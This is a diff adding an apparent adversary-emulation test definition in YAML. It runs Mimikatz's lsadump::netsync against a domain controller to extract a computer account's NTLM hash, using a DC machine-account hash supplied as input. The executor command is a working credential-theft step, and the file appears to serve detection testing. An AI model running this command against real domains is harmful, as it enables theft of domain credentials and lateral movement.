@@ -1,0 +1,36 @@
+---
+attack_technique: T9999
+display_name: NetSync
+ 
+atomic_tests:
+- name: Mimikatz NetSync
+  description: |
+    Note: Must obtain the NTLM hash of a DC Machine Account first
+    [Reference]( https://github.com/gentilkiwi/mimikatz/commit/58a73be7531dc376cc1b0dda15bc3b1daef272c5#diff-a754a2cef0f573d437b5f47d8dd0f33c)
+ 
+  supported_platforms:
+    - windows
+ 
+  input_arguments:
+    domain_fqdn:
+      description: Domain FQDN
+      type: string
+      default: windomain.local
+    dc_machine_name:
+      description: Domain Controler (DC) Machine Name
+      type: string
+      default: dc$
+    ntlm:
+      description: ntlm hash
+      type: string
+      default: <DC$ NTLM HASH Here>
+    target_computer_machine_name:
+      description: Target Computer Machine Name
+      type: string
+      default: win10$
+ 
+  executor:
+    name: command_prompt
+    command: |
+        C:\Tools\Mimikatz\x64\mimikatz "lsadump::netsync /dc:#{domain_fqdn} /user:#{dc_machine_name} /ntlm:#{ntlm} /account:#{target_computer_machine_name}
+ 
